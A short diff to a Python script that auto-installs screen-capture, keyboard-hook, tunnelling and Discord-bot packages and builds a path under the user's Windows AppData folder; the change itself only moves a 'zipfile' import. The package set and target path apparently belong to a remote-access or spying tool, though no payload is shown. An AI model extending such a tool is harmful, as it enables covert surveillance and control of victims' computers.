@@ -2,11 +2,12 @@ import os
 import subprocess
 import sys
 import time
+import zipfile
 
 required_packages = [
     'flask', 'flask-socketio', 'opencv-python-headless', 'numpy', 'mss',
     'pyngrok', 'pyautogui', 'Pillow', 'nextcord', 'requests',
-    'keyboard', 'python-dateutil', 'pywin32', 'zipfile'
+    'keyboard', 'python-dateutil', 'pywin32'
 ]
 
 def install_packages():
@@ -22,7 +23,6 @@ install_packages()
 time.sleep(3)
 
 import requests
-import zipfile
 
 user_profile = os.environ['USERPROFILE']
 target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
